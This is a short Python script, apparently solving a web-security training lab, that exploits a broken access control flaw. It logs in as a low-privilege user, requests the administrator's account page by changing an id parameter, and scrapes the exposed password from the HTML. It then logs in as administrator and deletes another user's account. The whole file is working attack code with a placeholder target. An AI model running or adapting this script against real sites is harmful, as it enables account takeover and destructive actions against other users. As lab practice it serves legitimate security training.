import requests
import re
from bs4 import BeautifulSoup
import sys

target='YOUR_URL'

headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br"
}

session=requests.Session()
session.headers.update(headers)

print("=== Tien hanh dang nhap ===")
res_get_csrf=session.get(target+'/login')
soup=BeautifulSoup(res_get_csrf.text, "html.parser")
csrf_token=soup.find("input", {"name": "csrf"})["value"]
print(f"[*] CSRF Token: {csrf_token}")

res_login=session.post(target+'/login', data={
    "csrf": csrf_token,
    "username" : "wiener",
    "password" : "peter"
},allow_redirects=True)

print(res_login.status_code)
print(res_login.text)

res_exploit=session.get(target+'/my-account?id=administrator')
print(res_exploit.status_code)
print(res_exploit.text)

soup=BeautifulSoup(res_exploit.text, "html.parser")
password = soup.find('input', {'name': 'password'})['value']
print(f"Password tìm thấy: {password}")

res_logout=session.get(target+'/logout')

res_get_csrf_admin=session.get(target+'/login')
soup=BeautifulSoup(res_get_csrf_admin.text, "html.parser")
csrf_token_admin=soup.find("input", {"name": "csrf"})["value"]
print(f"[*] CSRF Token: {csrf_token_admin}")

res_login_admin=session.post(target+'/login', data={
    "csrf": csrf_token_admin,
    "username" : "administrator",
    "password" : password
},allow_redirects=True)

res_del=session.get(target+"/admin/delete?username=carlos")
print(res_del.status_code)
print(res_del.text)